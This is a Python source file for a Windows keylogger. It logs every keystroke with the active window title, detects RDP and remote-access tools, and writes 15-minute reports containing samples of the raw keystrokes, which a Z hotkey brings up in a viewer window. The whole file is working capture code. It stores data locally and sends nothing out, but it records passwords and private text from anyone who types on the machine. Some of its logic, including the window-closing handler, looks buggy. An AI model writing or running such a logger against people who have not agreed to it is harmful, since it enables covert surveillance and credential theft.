"""
Keylogger with Z/A Hotkey Report Viewer
----------------------------------------------
This script logs keystrokes and monitors for remote access.
Features hotkeys:
- Z to show report
- A to close report

Requirements:
- pynput
- psutil
- pywin32
- tkinter (standard library)
"""

import os
import datetime
import threading
import time
from pynput import keyboard
import psutil
import socket
import win32gui
import traceback
import tkinter as tk
from tkinter import scrolledtext
import sys

# Configuration - Paths for log files
LOG_FOLDER = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
KEYSTROKE_FILE = os.path.join(LOG_FOLDER, "keystrokes.txt")
REMOTE_FILE = os.path.join(LOG_FOLDER, "remote_access.txt")
REPORTS_FOLDER = os.path.join(LOG_FOLDER, "reports")
FIFTEEN_MIN_REPORTS_FOLDER = os.path.join(REPORTS_FOLDER, "fifteen_min")

# Global variables
current_window = ""
remote_connected = False
keylogger_running = False
remote_monitor_running = False
reporting_active = False
report_counter = 0
start_time = None
report_viewer_open = False
report_window = None
z_pressed = False

# Create necessary folders before starting
for folder in [LOG_FOLDER, REPORTS_FOLDER, FIFTEEN_MIN_REPORTS_FOLDER]:
    if not os.path.exists(folder):
        try:
            os.makedirs(folder)
            print(f"Created folder: {folder}")
        except Exception as e:
            print(f"Error creating folder {folder}: {e}")

# Initialize log files to ensure they exist
try:
    if not os.path.exists(KEYSTROKE_FILE):
        with open(KEYSTROKE_FILE, 'w', encoding='utf-8') as f:
            f.write("Keylogger initialized\n")
    
    if not os.path.exists(REMOTE_FILE):
        with open(REMOTE_FILE, 'w', encoding='utf-8') as f:
            f.write("Remote access monitoring initialized\n")
except Exception as e:
    print(f"Error initializing log files: {e}")

def get_active_window():
    """Get the title of the currently active window"""
    try:
        window = win32gui.GetForegroundWindow()
        window_title = win32gui.GetWindowText(window)
        return window_title
    except Exception as e:
        print(f"Error getting active window: {e}")
        return "Unknown Window"

def log_keystroke(text):
    """Save keystroke to the log file"""
    global current_window
    
    try:
        with open(KEYSTROKE_FILE, 'a', encoding='utf-8') as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            window_title = get_active_window()
            
            # Log window change if necessary
            if window_title != current_window:
                f.write(f"\n[{timestamp}] Window Changed: {window_title}\n")
                current_window = window_title
                
            # Log the keystroke
            f.write(f"[{timestamp}] {text}\n")
        
        # Only print visual feedback for important keystrokes to avoid console spam
        if not text.startswith("Key:") or len(text) > 10:
            print(f"Logged: {text}")
    except Exception as e:
        print(f"Error logging keystroke: {e}")

def log_remote_access(text):
    """Save remote access event to the log file"""
    try:
        with open(REMOTE_FILE, 'a', encoding='utf-8') as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"[{timestamp}] {text}\n")
        
        # Also log to keystroke file for awareness
        with open(KEYSTROKE_FILE, 'a', encoding='utf-8') as f:
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"\n[{timestamp}] REMOTE ACCESS: {text}\n")
            
        print(f"Remote Access: {text}")
    except Exception as e:
        print(f"Error logging remote access: {e}")

def on_key_press(key):
    """Function called when a key is pressed"""
    global z_pressed, report_viewer_open
    
    try:
        # Check for 'z' key to show report
        if hasattr(key, 'char') and key.char == 'z' and not report_viewer_open:
            z_pressed = True
            # Use a thread to show the report to avoid blocking the listener
            thread = threading.Thread(target=show_latest_report)
            thread.daemon = True
            thread.start()
            # Still log the keystroke
            log_keystroke(f"Key: {key.char}")
            return
            
        # Check for 'a' key to close report
        if hasattr(key, 'char') and key.char == 'a' and report_viewer_open:
            close_report_viewer()
            # Still log the keystroke
            log_keystroke(f"Key: {key.char}")
            return
        
        # Log all other keystrokes
        if hasattr(key, 'char'):
            # Regular key
            if key.char:
                log_keystroke(f"Key: {key.char}")
        else:
            # Special key
            log_keystroke(f"Special key: {key}")
                
    except Exception as e:
        print(f"Error processing keystroke: {e}")

def on_key_release(key):
    """Function called when a key is released"""
    global z_pressed
    
    try:
        if hasattr(key, 'char') and key.char == 'z':
            z_pressed = False
    except Exception as e:
        print(f"Error in key release: {e}")

def check_remote_connection():
    """Check if the computer is being accessed remotely"""
    global remote_connected, remote_monitor_running
    
    print("Remote access monitoring started")
    
    while remote_monitor_running:
        try:
            # Check for RDP connections (port 3389)
            rdp_connected = False
            for conn in psutil.net_connections():
                if hasattr(conn, 'laddr') and hasattr(conn.laddr, 'port'):
                    if conn.laddr.port == 3389 and conn.status == 'ESTABLISHED':
                        rdp_connected = True
                        break
            
            # Check for common remote access tools
            remote_tools = ['teamviewer', 'anydesk', 'vnc', 'remote', 'screenconnect']
            running_procs = []
            for proc in psutil.process_iter(['name']):
                try:
                    proc_name = proc.info['name'].lower()
                    running_procs.append(proc_name)
                except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                    pass
            
            remote_tool_running = False
            detected_tools = []
            
            for proc in running_procs:
                for tool in remote_tools:
                    if tool in proc:
                        remote_tool_running = True
                        detected_tools.append(proc)
            
            # Determine if remote connection status changed
            currently_remote = rdp_connected or remote_tool_running
            
            if currently_remote and not remote_connected:
                # Remote connection started
                message = "Remote connection detected"
                if rdp_connected:
                    message += " (RDP)"
                if detected_tools:
                    message += f" (Tools: {', '.join(detected_tools)})"
                
                log_remote_access(message)
                remote_connected = True
                
                # Generate immediate report for remote access
                generate_remote_access_report(message)
                
            elif not currently_remote and remote_connected:
                # Remote connection ended
                log_remote_access("Remote connection ended")
                remote_connected = False
                
        except Exception as e:
            print(f"Error checking remote connections: {e}")
        
        # Check again in 5 seconds
        time.sleep(5)

def generate_remote_access_report(message):
    """Generate a special report when remote access is detected"""
    try:
        now = datetime.datetime.now()
        report_start = now - datetime.timedelta(minutes=30)  # Check last 30 minutes of activity
        
        # Create a unique report filename with timestamp
        timestamp_str = now.strftime("%Y-%m-%d_%H-%M-%S")
        report_filename = os.path.join(REPORTS_FOLDER, f"remote_access_report_{timestamp_str}.txt")
        
        # Get statistics
        keystroke_count, window_changes = count_keystrokes_in_interval(report_start, now)
        remote_events = get_remote_access_events(report_start, now)
        active_windows = get_active_windows(report_start, now)
        system_info = get_system_info()
        
        # Write the report
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(f"REMOTE ACCESS DETECTED - SECURITY REPORT\n")
            f.write(f"=============================================\n\n")
            
            f.write(f"Remote Access Event: {message}\n")
            f.write(f"Time Detected: {now.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
            
            f.write(f"System Information\n")
            f.write(f"------------------\n")
            f.write(f"Computer Name: {system_info.get('hostname', 'Unknown')}\n")
            f.write(f"IP Address: {system_info.get('ip_address', 'Unknown')}\n")
            f.write(f"Logged-in User: {system_info.get('logged_in_user', 'Unknown')}\n")
            f.write(f"CPU Usage: {system_info.get('cpu_usage', 'Unknown')}\n")
            f.write(f"Memory Usage: {system_info.get('memory_usage', 'Unknown')}\n\n")
            
            f.write(f"Top Processes\n")
            f.write(f"-------------\n")
            for proc in system_info.get('top_processes', []):
                f.write(f"- {proc}\n")
            f.write("\n")
            
            f.write(f"Recent Activity (Last 30 Minutes)\n")
            f.write(f"----------------------------------\n")
            f.write(f"Total Keystrokes: {keystroke_count}\n")
            f.write(f"Window Changes: {window_changes}\n\n")
            
            f.write(f"Most Active Windows\n")
            f.write(f"----------------------------\n")
            for window, count in active_windows:
                f.write(f"- {window}: {count} events\n")
            f.write("\n")
            
            f.write(f"Remote Access History\n")
            f.write(f"--------------------\n")
            if remote_events:
                for event in remote_events:
                    f.write(f"{event}\n")
            else:
                f.write("No previous remote access events in this period.\n")
            f.write("\n")
            
            # Include sample of recent keystrokes
            f.write(f"Recent Keystroke Sample\n")
            f.write(f"----------------------\n")
            try:
                if os.path.exists(KEYSTROKE_FILE):
                    with open(KEYSTROKE_FILE, 'r', encoding='utf-8') as kf:
                        lines = kf.readlines()
                        
                    sample_lines = []
                    for line in reversed(lines):  # Start from the end (most recent)
                        if line.strip() and line.startswith('['):
                            timestamp_str = line[1:line.find(']')]
                            try:
                                timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                                if report_start <= timestamp <= now:
                                    sample_lines.insert(0, line.strip())  # Add to beginning to maintain chronological order
                                    if len(sample_lines) >= 20:  # Limit to 20 sample lines
                                        break
                            except:
                                continue
                                
                    if sample_lines:
                        for line in sample_lines:
                            f.write(f"{line}\n")
                    else:
                        f.write("No keystroke samples available for this period.\n")
                else:
                    f.write("Keystroke log file does not exist.\n")
            except Exception as e:
                f.write(f"Error retrieving keystroke samples: {str(e)}\n")
                
        print(f"Remote access report generated: {report_filename}")
        
    except Exception as e:
        print(f"Error generating remote access report: {e}")

def count_keystrokes_in_interval(start_timestamp, end_timestamp):
    """Count keystroke events in the specified time interval"""
    try:
        count = 0
        window_changes = 0
        
        # Check if keystroke file exists
        if not os.path.exists(KEYSTROKE_FILE):
            return 0, 0
        
        with open(KEYSTROKE_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            
        for line in lines:
            # Skip empty lines
            if not line.strip():
                continue
                
            # Check if line has a timestamp
            if line.startswith('[') and ']' in line:
                timestamp_str = line[1:line.find(']')]
                try:
                    timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                    if start_timestamp <= timestamp <= end_timestamp:
                        if "Window Changed" in line:
                            window_changes += 1
                        elif "Key:" in line:
                            count += 1
                except Exception:
                    # Skip lines with invalid timestamp format
                    continue
                    
        return count, window_changes
    except Exception as e:
        print(f"Error counting keystrokes: {e}")
        return 0, 0

def get_remote_access_events(start_timestamp, end_timestamp):
    """Get remote access events in the specified time interval"""
    try:
        events = []
        if os.path.exists(REMOTE_FILE):
            with open(REMOTE_FILE, 'r', encoding='utf-8') as f:
                lines = f.readlines()
                
            for line in lines:
                # Skip empty lines
                if not line.strip():
                    continue
                    
                # Check if line has a timestamp
                if line.startswith('[') and ']' in line:
                    timestamp_str = line[1:line.find(']')]
                    try:
                        timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                        if start_timestamp <= timestamp <= end_timestamp:
                            events.append(line.strip())
                    except Exception:
                        # Skip lines with invalid timestamp format
                        continue
                        
        return events
    except Exception as e:
        print(f"Error getting remote events: {e}")
        return []

def get_active_windows(start_timestamp, end_timestamp):
    """Get the list of active windows in the specified time interval"""
    try:
        windows = {}
        
        # Check if keystroke file exists
        if not os.path.exists(KEYSTROKE_FILE):
            return []
        
        with open(KEYSTROKE_FILE, 'r', encoding='utf-8') as f:
            lines = f.readlines()
            
        current = None
        for line in lines:
            # Skip empty lines
            if not line.strip():
                continue
                
            # Check if line has a timestamp
            if line.startswith('[') and ']' in line:
                timestamp_str = line[1:line.find(']')]
                try:
                    timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                    if start_timestamp <= timestamp <= end_timestamp:
                        if "Window Changed:" in line:
                            window_name = line.split("Window Changed:")[1].strip()
                            current = window_name
                            windows[current] = windows.get(current, 0) + 1
                        elif current and "Key:" in line:
                            windows[current] = windows.get(current, 0) + 1
                except Exception:
                    # Skip lines with invalid timestamp format
                    continue
                    
        # Sort windows by activity (keystroke count)
        sorted_windows = sorted(windows.items(), key=lambda x: x[1], reverse=True)
        return sorted_windows[:10]  # Return top 10 most active windows
    except Exception as e:
        print(f"Error getting active windows: {e}")
        return []

def get_system_info():
    """Get system information for the report"""
    info = {}
    try:
        info['hostname'] = socket.gethostname()
        try:
            info['ip_address'] = socket.gethostbyname(socket.gethostname())
        except:
            info['ip_address'] = "Could not determine IP"
        
        info['cpu_usage'] = f"{psutil.cpu_percent()}%"
        info['memory_usage'] = f"{psutil.virtual_memory().percent}%"
        
        try:
            info['logged_in_user'] = os.getlogin()
        except:
            info['logged_in_user'] = "Could not determine user"
        
        # Get running processes (top 10 by CPU usage)
        processes = []
        for proc in sorted(psutil.process_iter(['pid', 'name', 'cpu_percent']), 
                         key=lambda p: p.info['cpu_percent'] or 0, reverse=True)[:10]:
            try:
                processes.append(f"{proc.info['name']} (PID: {proc.info['pid']}, CPU: {proc.info['cpu_percent']}%)")
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                continue
        info['top_processes'] = processes
    except Exception as e:
        print(f"Error getting system info: {e}")
    
    return info

def show_latest_report():
    """Show the most recent report in a GUI window"""
    global report_viewer_open, report_window
    
    try:
        # If already open, just bring to front
        if report_viewer_open and report_window:
            try:
                report_window.lift()
                report_window.focus_force()
                return
            except Exception:
                # Window may have been closed improperly
                report_viewer_open = False
                report_window = None
                
        # Check for available reports
        regular_reports = []
        if os.path.exists(FIFTEEN_MIN_REPORTS_FOLDER):
            regular_reports = [
                os.path.join(FIFTEEN_MIN_REPORTS_FOLDER, f) 
                for f in os.listdir(FIFTEEN_MIN_REPORTS_FOLDER) 
                if f.startswith("report_")
            ]
        
        # Also check for remote access reports
        remote_reports = []
        if os.path.exists(REPORTS_FOLDER):
            remote_reports = [
                os.path.join(REPORTS_FOLDER, f) 
                for f in os.listdir(REPORTS_FOLDER) 
                if f.startswith("remote_access_report_")
            ]
        
        # Combine all reports and sort by filename (timestamp)
        all_reports = []
        all_reports.extend(regular_reports)
        all_reports.extend(remote_reports)
        all_reports.sort(reverse=True)
        
        if not all_reports:
            # If no reports exist yet, create a temporary one
            now = datetime.datetime.now()
            report_start = now - datetime.timedelta(minutes=15)
            
            # Get statistics
            keystroke_count, window_changes = count_keystrokes_in_interval(report_start, now)
            remote_events = get_remote_access_events(report_start, now)
            active_windows = get_active_windows(report_start, now)
            system_info = get_system_info()
            
            # Create a temporary report filename
            temp_report = os.path.join(FIFTEEN_MIN_REPORTS_FOLDER, f"temp_report_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt")
            
            # Write a temporary report
            with open(temp_report, 'w', encoding='utf-8') as f:
                f.write(f"Keylogger Current Status Report\n")
                f.write(f"=============================================\n\n")
                
                f.write(f"Report Period: {report_start.strftime('%Y-%m-%d %H:%M:%S')} - {now.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Report Generated: {now.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                f.write(f"System Information\n")
                f.write(f"------------------\n")
                f.write(f"Computer Name: {system_info.get('hostname', 'Unknown')}\n")
                f.write(f"IP Address: {system_info.get('ip_address', 'Unknown')}\n")
                f.write(f"Logged-in User: {system_info.get('logged_in_user', 'Unknown')}\n")
                f.write(f"CPU Usage: {system_info.get('cpu_usage', 'Unknown')}\n")
                f.write(f"Memory Usage: {system_info.get('memory_usage', 'Unknown')}\n\n")
                
                f.write(f"Top Processes\n")
                f.write(f"-------------\n")
                for proc in system_info.get('top_processes', []):
                    f.write(f"- {proc}\n")
                f.write("\n")
                
                f.write(f"Keystroke Activity\n")
                f.write(f"-----------------\n")
                f.write(f"Total Keystrokes: {keystroke_count}\n")
                f.write(f"Window Changes: {window_changes}\n\n")
                
                f.write(f"Most Active Windows (Top 10)\n")
                f.write(f"----------------------------\n")
                for window, count in active_windows:
                    f.write(f"- {window}: {count} events\n")
                f.write("\n")
                
                f.write(f"Remote Access Events\n")
                f.write(f"--------------------\n")
                if remote_events:
                    for event in remote_events:
                        f.write(f"{event}\n")
                else:
                    f.write("No remote access events detected in this period.\n")
                f.write("\n")
                
                # Include sample of recent keystrokes
                f.write(f"Recent Keystroke Sample\n")
                f.write(f"----------------------\n")
                try:
                    if os.path.exists(KEYSTROKE_FILE):
                        with open(KEYSTROKE_FILE, 'r', encoding='utf-8') as kf:
                            lines = kf.readlines()
                            
                        sample_lines = []
                        for line in reversed(lines):  # Start from the end (most recent)
                            if line.strip() and line.startswith('['):
                                timestamp_str = line[1:line.find(']')]
                                try:
                                    timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                                    if report_start <= timestamp <= now:
                                        sample_lines.insert(0, line.strip())  # Add to beginning to maintain chronological order
                                        if len(sample_lines) >= 20:  # Limit to 20 sample lines
                                            break
                                except:
                                    continue
                                    
                        if sample_lines:
                            for line in sample_lines:
                                f.write(f"{line}\n")
                        else:
                            f.write("No keystroke samples available for this period.\n")
                    else:
                        f.write("Keystroke log file does not exist.\n")
                except Exception as e:
                    f.write(f"Error retrieving keystroke samples: {str(e)}\n")
            
            latest_report = temp_report
        else:
            latest_report = all_reports[0]  # Get most recent report
        
        # Create the Tkinter window
        report_window = tk.Tk()
        report_window.title("System Activity Report")
        report_window.geometry("900x700")
        
        # Add a note about keyboard shortcuts
        note_frame = tk.Frame(report_window)
        note_frame.pack(fill=tk.X, padx=10, pady=5)
        
        tk.Label(note_frame, text="Activity Report", font=("Arial", 14, "bold")).pack(side=tk.LEFT)
        tk.Label(note_frame, text="Press 'A' to close this window", fg="blue").pack(side=tk.RIGHT)
        
        # Add report content in a scrolled text widget
        text_frame = tk.Frame(report_window)
        text_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
        
        report_text = scrolledtext.ScrolledText(text_frame, font=("Courier New", 10))
        report_text.pack(fill=tk.BOTH, expand=True)
        
        # Load report content
        try:
            if os.path.exists(latest_report):
                with open(latest_report, 'r', encoding='utf-8') as f:
                    content = f.read()
                    report_text.insert(tk.END, content)
                    report_text.config(state=tk.DISABLED)  # Make read-only
            else:
                report_text.insert(tk.END, "Error: Could not find report file.")
        except Exception as e:
            report_text.insert(tk.END, f"Error loading report: {e}")
            
        # Setup close handlers
        def on_window_close():
            global report_viewer_open, report_window
            report_viewer_open = False
            report_window = None
            try:
                report_window.destroy()
            except Exception:
                pass
                
        report_window.protocol("WM_DELETE_WINDOW", on_window_close)
        
        # Add key binding for 'a' to close the window
        def key_handler(event):
            if event.char == 'a':
                on_window_close()
                
        report_window.bind("<Key>", key_handler)
        
        # Update global state
        report_viewer_open = True
        
        # Delete temporary report after a delay
        if "temp_report_" in latest_report:
            try:
                report_window.after(1000, lambda: os.remove(latest_report) if os.path.exists(latest_report) else None)
            except:
                pass
        
        # Start the mainloop for the window
        report_window.mainloop()
        
    except Exception as e:
        print(f"Error showing report: {e}")
        print(traceback.format_exc())
        report_viewer_open = False

def close_report_viewer():
    """Close the report viewer window"""
    global report_viewer_open, report_window
    
    if report_viewer_open and report_window:
        try:
            report_window.destroy()
        except Exception:
            pass
            
        report_viewer_open = False
        report_window = None

def generate_fifteen_min_report():
    """Generate a report text file every 15 minutes of activity"""
    global report_counter, start_time, reporting_active
    
    my_reporting_active = True  # Local variable to track reporting state
    interval_minutes = 15  # Fixed at 15 minutes for this version
    max_reports = 96  # 24 hours worth of 15-minute reports
    
    while my_reporting_active and report_counter < max_reports:
        try:
            # Sleep until the next 15-minute mark
            current_time = datetime.datetime.now()
            minutes_to_next = interval_minutes - (current_time.minute % interval_minutes)
            if minutes_to_next == interval_minutes:
                minutes_to_next = 0
                
            next_report_time = current_time + datetime.timedelta(minutes=minutes_to_next, 
                                                              seconds=-current_time.second, 
                                                              microseconds=-current_time.microsecond)
            
            if minutes_to_next == 0:  # We're exactly at a 15-minute mark
                next_report_time = next_report_time + datetime.timedelta(minutes=interval_minutes)
                
            sleep_seconds = (next_report_time - current_time).total_seconds()
            
            print(f"Next report will be generated at {next_report_time.strftime('%H:%M:%S')} (in {sleep_seconds/60:.1f} minutes)")
            time.sleep(sleep_seconds)
            
            # Check if we should still be running (global state may have changed)
            if not reporting_active:
                break
                
            # Calculate reporting period
            now = datetime.datetime.now()
            report_end = now
            report_start = now - datetime.timedelta(minutes=interval_minutes)
            
            # Create a unique report filename with timestamp
            timestamp_str = now.strftime("%Y-%m-%d_%H-%M-%S")
            report_filename = os.path.join(FIFTEEN_MIN_REPORTS_FOLDER, f"report_{timestamp_str}.txt")
            
            # Get statistics
            keystroke_count, window_changes = count_keystrokes_in_interval(report_start, report_end)
            remote_events = get_remote_access_events(report_start, report_end)
            active_windows = get_active_windows(report_start, report_end)
            system_info = get_system_info()
            
            # Write the report to a separate text file
            with open(report_filename, 'w', encoding='utf-8') as f:
                f.write(f"Keylogger 15-Minute Report\n")
                f.write(f"=============================================\n\n")
                
                f.write(f"Report Period: {report_start.strftime('%Y-%m-%d %H:%M:%S')} - {report_end.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Report Number: {report_counter + 1} of {max_reports}\n")
                f.write(f"Report Generated: {now.strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                
                f.write(f"System Information\n")
                f.write(f"------------------\n")
                f.write(f"Computer Name: {system_info.get('hostname', 'Unknown')}\n")
                f.write(f"IP Address: {system_info.get('ip_address', 'Unknown')}\n")
                f.write(f"Logged-in User: {system_info.get('logged_in_user', 'Unknown')}\n")
                f.write(f"CPU Usage: {system_info.get('cpu_usage', 'Unknown')}\n")
                f.write(f"Memory Usage: {system_info.get('memory_usage', 'Unknown')}\n\n")
                
                f.write(f"Top Processes\n")
                f.write(f"-------------\n")
                for proc in system_info.get('top_processes', []):
                    f.write(f"- {proc}\n")
                f.write("\n")
                
                f.write(f"Keystroke Activity\n")
                f.write(f"-----------------\n")
                f.write(f"Total Keystrokes: {keystroke_count}\n")
                f.write(f"Window Changes: {window_changes}\n\n")
                
                f.write(f"Most Active Windows (Top 10)\n")
                f.write(f"----------------------------\n")
                for window, count in active_windows:
                    f.write(f"- {window}: {count} events\n")
                f.write("\n")
                
                f.write(f"Remote Access Events\n")
                f.write(f"--------------------\n")
                if remote_events:
                    for event in remote_events:
                        f.write(f"{event}\n")
                else:
                    f.write("No remote access events detected in this period.\n")
                f.write("\n")
                
                # Include sample of recent keystrokes
                f.write(f"Recent Keystroke Sample\n")
                f.write(f"----------------------\n")
                try:
                    if os.path.exists(KEYSTROKE_FILE):
                        with open(KEYSTROKE_FILE, 'r', encoding='utf-8') as kf:
                            lines = kf.readlines()
                            
                        sample_lines = []
                        for line in reversed(lines):  # Start from the end (most recent)
                            if line.strip() and line.startswith('['):
                                timestamp_str = line[1:line.find(']')]
                                try:
                                    timestamp = datetime.datetime.strptime(timestamp_str, "%Y-%m-%d %H:%M:%S")
                                    if report_start <= timestamp <= report_end:
                                        sample_lines.insert(0, line.strip())  # Add to beginning to maintain chronological order
                                        if len(sample_lines) >= 20:  # Limit to 20 sample lines
                                            break
                                except:
                                    continue
                                    
                        if sample_lines:
                            for line in sample_lines:
                                f.write(f"{line}\n")
                        else:
                            f.write("No keystroke samples available for this period.\n")
                    else:
                        f.write("Keystroke log file does not exist.\n")
                except Exception as e:
                    f.write(f"Error retrieving keystroke samples: {str(e)}\n")
            
            print(f"Report generated: {report_filename}")
            
            # Clean up old reports (keep only the most recent 50)
            try:
                reports = sorted([
                    os.path.join(FIFTEEN_MIN_REPORTS_FOLDER, f) 
                    for f in os.listdir(FIFTEEN_MIN_REPORTS_FOLDER) 
                    if f.startswith("report_")
                ])
                
                if len(reports) > 50:
                    for old_report in reports[:-50]:
                        try:
                            os.remove(old_report)
                        except Exception as e:
                            print(f"Error removing old report {old_report}: {e}")
            except Exception as e:
                print(f"Error cleaning up old reports: {e}")
            
            # Increment report counter
            report_counter += 1
            
            # If we've reached max reports, start over
            if report_counter >= max_reports:
                print(f"Completed {max_reports} reports. Starting a new cycle.")
                report_counter = 0
                
        except Exception as e:
            print(f"Error generating report: {e}")
            print(traceback.format_exc())
            time.sleep(60)  # Wait a minute and try again

def start_keylogger():
    """Start the keylogger"""
    global keylogger_running, start_time
    
    # Initialize log files
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    start_time = datetime.datetime.now()
    
    # Create or append to keystroke log
    with open(KEYSTROKE_FILE, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"Keylogger started at {timestamp}\n")
        f.write(f"{'='*50}\n\n")
    
    # Create or append to remote access log
    with open(REMOTE_FILE, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*50}\n")
        f.write(f"Remote access monitoring started at {timestamp}\n")
        f.write(f"{'='*50}\n\n")
    
    print(f"Keylogger started. Logs will be saved to:")
    print(f"- Keystrokes: {KEYSTROKE_FILE}")
    print(f"- Remote access events: {REMOTE_FILE}")
    print(f"- Reports: {FIFTEEN_MIN_REPORTS_FOLDER}")
    print(f"- Special remote access reports: {REPORTS_FOLDER}")
    print(f"Press Z to view latest report, A to close report")
    
    # Start the keylogger
    keylogger_running = True
    keyboard_listener = keyboard.Listener(on_press=on_key_press, on_release=on_key_release)
    keyboard_listener.daemon = True
    keyboard_listener.start()
    
    return keyboard_listener

def start_remote_monitor():
    """Start remote access monitoring"""
    global remote_monitor_running
    
    remote_monitor_running = True
    remote_thread = threading.Thread(target=check_remote_connection)
    remote_thread.daemon = True
    remote_thread.start()
    
    return remote_thread

def start_reporting():
    """Start the 15-minute reporting system"""
    global reporting_active
    
    reporting_active = True
    report_thread = threading.Thread(target=generate_fifteen_min_report)
    report_thread.daemon = True
    report_thread.start()
    
    return report_thread

def main():
    """Main function to run the keylogger"""
    # Make sure to declare all global variables
    global reporting_active, report_counter, start_time, report_viewer_open, report_window
    
    try:
        # Register a unique mutex (to ensure only one instance runs)
        if os.name == 'nt':
            try:
                import win32event
                import win32api
                from winerror import ERROR_ALREADY_EXISTS
                
                mutex = win32event.CreateMutex(None, 1, "Global\\KeyloggerWithZAKeysMutex")
                if win32api.GetLastError() == ERROR_ALREADY_EXISTS:
                    print("Another instance of the keylogger is already running.")
                    sys.exit(1)
            except ImportError:
                # win32event might not be available
                pass
        
        # Start keylogger
        keyboard_listener = start_keylogger()
        
        # Start remote monitoring
        remote_thread = start_remote_monitor()
        
        # Start reporting system
        report_thread = start_reporting()
        
        print("Keylogger, remote monitoring, and reporting system started successfully!")
        print("Press Ctrl+C to stop...")
        print(f"Press Z to view the latest report, A to close the report viewer")
        
        # Keep the main thread alive
        while True:
            time.sleep(1)
            
            # Check if report viewer needs updates
            if report_viewer_open and report_window:
                try:
                    # Update the Tkinter event loop occasionally
                    report_window.update()
                except Exception:
                    # Window might have been closed
                    report_viewer_open = False
                    report_window = None
            
    except KeyboardInterrupt:
        print("\nStopping keylogger...")
        
    except Exception as e:
        print(f"Error: {e}")
        print(traceback.format_exc())
        
    finally:
        # Clean shutdown
        global keylogger_running, remote_monitor_running
        keylogger_running = False
        remote_monitor_running = False
        reporting_active = False
        
        # Close GUI if openz
        close_report_viewer()
        
        print("Keylogger stopped")

if __name__ == "__main__":
    main()